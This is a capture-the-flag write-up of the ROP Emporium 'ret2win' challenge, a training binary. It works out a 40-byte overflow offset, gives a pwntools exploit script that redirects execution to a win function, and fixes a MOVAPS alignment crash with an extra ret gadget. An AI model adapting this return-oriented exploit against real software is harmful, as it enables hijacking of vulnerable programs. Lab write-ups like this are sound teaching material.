# RET2WIN

*This document only documents the x86_64 version of ret2win. I only included the 32 bit version because I was trying to sanity check my buffer overflow.*

[ret2win](https://ropemporium.com/challenge/ret2win.html)

This is a classic buffer overflow attack that asks you to overwrite the instruction pointer to get the program to run a different function instead of continuing with the instruction after the call to `pwnme`. According GDB (and the output of the `ret2win` program itself), the `pwnme` function will try to read a 0x38 (56) byte string from `stdin` and copy it to a 0x20 (32) byte buffer. This buffer is 0x20 bytes from `rbp`, which means that it is 0x28 (40) bytes from the saved RIP on the stack.

```
# snippet of disassembled `pwnme` function
   0x0000000000400733 <+75>:    lea    rax,[rbp-0x20]
   0x0000000000400737 <+79>:    mov    edx,0x38
   0x000000000040073c <+84>:    mov    rsi,rax
   0x000000000040073f <+87>:    mov    edi,0x0
   0x0000000000400744 <+92>:    call   0x400590 <read@plt>
```

```
$ ./ret2win
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> 
```

This leaves us with 56-40=16 bytes (or 2 64-bit integers) for our ROP chain. Luckily for us, this is all that we need to take control of the RIP.

All we have to do is to write 40 bytes of garbage, then write the instruction pointer of the `ret2win` function to get the flag...

```
$ nm ./ret2win | grep ret2win
0000000000400756 t ret2win
```

```python
# ./win.py
...
from pwn import *
...
attack = b"A"*40 + p64(0x400756)
io.sendline(attack)
...
```

...and it should work right?

Right?

What's this? A segfault?!

```
# output of gdb
Program received signal SIGSEGV, Segmentation fault.
0x00007f7f1e288723 in ?? () from target:/usr/lib/libc.so.6
```

```
# where it all went wrong
► 0x7f7f1e288723    movaps xmmword ptr [rsp + 0x50], xmm0
```

We have encountered the dreaded *`MOVAPS issue`*. Don't panic, ROP Emporium's [beginners guide](https://ropemporium.com/guide.html) has a simple remedy for this problem.

```
# copied verbatim from the Common pitfalls section
so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.
```

Theoretically, all we need to do is to get a ROP gadget that allows us to `ret`urn to `ret2win`.

Using ROPgadget, we get this:

```
$ ROPgadget --binary ret2win | grep -E ": ret$"
0x000000000040053e : ret
```

And we add this after the garbage and just before the address of the function.

```python
# ./win.py
...
from pwn import *
...
attack = b"A"*40 + p64(0x40053e) + p64(0x400756)
io.sendline(attack)
...
```

and run `win.py` again:

```
$ ./win.py
[*] '/home/renoir/Code/remote/github.com/RenoirTan/ROPEmporium/ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/renoir/Code/remote/github.com/RenoirTan/ROPEmporium/ret2win/ret2win': pid 21913
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>\x05@\x00\x00\x00\x00\x00V\x07@\x00\x00\x00\x00\x00'
56
[*] Switching to interactive mode
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Process '/home/renoir/Code/remote/github.com/RenoirTan/ROPEmporium/ret2win/ret2win' stopped with exit code 0 (pid 21913)
[*] Got EOF while reading in interactive
$ 
```

Voila! There's our flag.